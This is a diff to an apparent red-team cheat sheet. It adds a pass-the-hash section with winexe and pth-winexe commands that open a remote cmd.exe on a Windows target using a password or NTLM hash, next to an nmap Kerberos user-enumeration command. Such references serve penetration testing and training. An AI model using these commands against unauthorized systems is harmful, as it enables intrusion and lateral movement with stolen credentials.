@@ -26,6 +26,15 @@ ENUM USERS DOMAIN-CONTROLLER
 nmap -p88 --script krb5-enum-users --script-args krb5-enumusers.realm="cyberspacekittens.local",userdb=/opt/userlist.txt <Domain Controller IP>
 ```
 
+PASS THE HASH LOGIN
+```
+winexe -U <domain/username>%<password> //<targetIP> cmd.exe
+
+Basic syntax w/ NTLM hash (pass the hash technique).
+
+pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe
+```
+
 HASHCAT RULE
 ```
 https://github.com/NotSoSecure/password_cracking_rules
